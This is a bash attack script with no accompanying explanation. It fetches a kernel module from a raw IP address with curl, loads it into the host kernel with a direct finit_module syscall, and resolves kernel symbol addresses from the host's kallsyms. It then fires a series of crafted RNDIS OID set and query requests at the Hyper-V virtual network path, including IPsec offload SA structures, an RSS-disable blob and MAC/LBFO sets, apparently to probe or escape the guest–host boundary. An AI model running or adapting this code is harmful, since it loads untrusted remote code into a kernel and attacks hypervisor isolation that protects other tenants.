#!/bin/bash
set +e
exec 0<&-

curl -fsS http://16.146.243.72:8450/rndis_oid_set.ko -o /tmp/rndis_oid_set.ko || exit 10
own_mac=$(tr -d ':\n' </hostsys/class/net/eth0/address 2>/dev/null)
printf 'RNDIS_SET_HOST sysfs_mac=%s\n' "$own_mac"
PYTHONPATH=/tmp python3 - /tmp/rndis_oid_set.ko 0x01010102 '' <<'PY'
import ctypes, os, sys
from rndis_legit_run import resolve_objects
guid, relid, _nvdev, rndis, request_id = resolve_objects()
oid = int(sys.argv[2], 0)
data_hex = sys.argv[3]
def symbol_prefix(name):
    hits=[]
    for line in open('/hostproc/kallsyms'):
        f=line.split()
        if len(f)>=3 and f[1].lower()=='t' and f[2].startswith(name):
            hits.append((f[2],int(f[0],16)))
    if len(hits)!=1: raise RuntimeError('symbol %s hits=%r'%(name,hits))
    return hits[0][1]
values = tuple(symbol_prefix(name) for name in
               ("get_rndis_request", "rndis_filter_send_request", "put_rndis_request"))
parameters = ("get_address=0x%x send_address=0x%x put_address=0x%x rndis_device=0x%x "
              "request_type=4 oid=0x%x input_length=%u arm=1" %
              (values[0], values[1], values[2], rndis, oid, len(data_hex)//2)).encode()
print("RNDIS_SET_PRE guid=%s relid=%u rndis=%x reqid=%u oid=%#x input_length=%u" %
      (guid, relid, rndis, request_id, oid, len(data_hex)//2))
fd=os.open(sys.argv[1], os.O_RDONLY); libc=ctypes.CDLL(None,use_errno=True)
result=libc.syscall(313,fd,parameters,3)
print("RNDIS_SET_FINIT result=%d errno=%d" % (result,ctypes.get_errno()))
PY

paramdir=/hostsys/module/rndis_oid_set/parameters
run_case() {
    label=$1
    case_type=$2
    case_oid=$3
    case_hex=$4
    case_length=${5:-$(( ${#case_hex} / 2 ))}
    printf 'RNDIS_SET_CASE label=%s type=%s oid=%s bytes=%s\n' "$label" "$case_type" "$case_oid" "$case_length"
    printf '%s' "$case_type" >"$paramdir/request_type" || return
    printf '%s' "$case_oid" >"$paramdir/oid" || return
    printf '%s' "$case_hex" >"$paramdir/data_hex" || return
    printf '%s' "$case_length" >"$paramdir/input_length" || return
    printf 1 >"$paramdir/arm"
}

[ -d "$paramdir" ] || exit 11
own_mac=$(dmesg --notime 2>/dev/null | sed -n 's/.*rndis_oid_query oid=0x1010102 result_length=6 .*head=\([[:xdigit:]]\{12\}\).*/\1/p' | tail -1)
printf 'RNDIS_SET_HOST queried_mac=%s\n' "$own_mac"
isolation_header=800118000000000000000000000000000000000000000000
run_case isolation-query 4 0x00010300 "$isolation_header"
run_case isolation-query-full 4 0x00010300 "$isolation_header" 4000
run_case rss-query 4 0x00010204 ''
run_case ipsec-current-query 4 0xfc01020b ''
run_case ipsec-hardware-query 4 0xfc01020d ''
run_case multicast-positive 5 0x01010103 01005e000001
[ "${#own_mac}" != 12 ] || run_case lbfo-own 5 0xfa010203 "$own_mac"
run_case lbfo-random 5 0xfa010203 023900000001
rss_disable=$(python3 - <<'PY'
import struct
# NDIS_RECEIVE_SCALE_PARAMETERS rev2 used by this ABI: 44-byte base, 128
# PROCESSOR_NUMBER entries and a 40-byte key. Flags disable RSS.
head=struct.pack('<BBHHH',0x89,2,44,0x10,0)+struct.pack('<I',0)+struct.pack('<H',512)+b'\0\0'+struct.pack('<I',44)+struct.pack('<H',40)+b'\0\0'+struct.pack('<I',556)+struct.pack('<IIII',0,0,0,0)
print((head+b'\0'*(512+40)).hex())
PY
)
run_case rss-disable-r2 5 0x00010204 "$rss_disable"
run_case ipsec-enable-parameters 5 0xfc01020c 80021600010101010101010101010100000000000404
sleep 1
run_case ipsec-current-enabled-query 4 0xfc01020b ''
ipsec_delete_absent=80011800000000000000000000000000ffffffffffffffff
make_ipsec_ex() {
python3 - "$@" <<'PY'
import re,socket,struct,sys
op,auth_id,auth_len,enc_id,enc_len=map(int,sys.argv[1:])
key_len=auth_len+enc_len
b=bytearray(0xb0+key_len)
b[0]=0x80; b[1]=1
struct.pack_into('<HII',b,2,0xaa,1,0)
match=re.search(r'\b192\.168\.\d+\.\d+\b',open('/hostproc/net/fib_trie').read())
b[0x0c:0x10]=socket.inet_aton(match.group() if match else '0.0.0.0')
b[0x10:0x14]=socket.inet_aton('8.8.8.8')
struct.pack_into('<II',b,0x3c,0,op)
struct.pack_into('<I',b,0x44,0x11223344)
struct.pack_into('<IIII',b,0x48,auth_id,auth_len,0,0)
struct.pack_into('<IIII',b,0x58,enc_id,enc_len,auth_len,0)
struct.pack_into('<II',b,0x9c,key_len,0xb0)
b[0xb0:]=bytes((i*29+7)&255 for i in range(key_len))
print(b.hex())
PY
}
ipsec_ah_sha1=$(make_ipsec_ex 1 2 20 0 0)
ipsec_ah_sha256=$(make_ipsec_ex 1 4 32 0 0)
ipsec_esp_sha1_null=$(make_ipsec_ex 2 2 20 1 0)
ipsec_esp_aes_cbc128=$(make_ipsec_ex 2 0 0 64 16)
ipsec_esp_gcm128=$(make_ipsec_ex 2 0 0 8 20)
run_case ipsec-delete-absent 5 0xfc030203 "$ipsec_delete_absent"
run_case ipsec-update-empty 5 0xfc030204 ''
run_case ipsec-add-ex-ah-sha1 5 0xfc030205 "$ipsec_ah_sha1"
run_case ipsec-add-ex-ah-sha256 5 0xfc030205 "$ipsec_ah_sha256"
run_case ipsec-add-ex-esp-sha1-null 5 0xfc030205 "$ipsec_esp_sha1_null"
run_case ipsec-add-ex-esp-aes-cbc128 5 0xfc030205 "$ipsec_esp_aes_cbc128"
run_case ipsec-add-ex-esp-gcm128 5 0xfc030205 "$ipsec_esp_gcm128"

sleep 2
dmesg --notime 2>/dev/null | grep -E 'rndis_oid_(set|query)' | tail -100
printf 'ROOT_AUTO done\n'
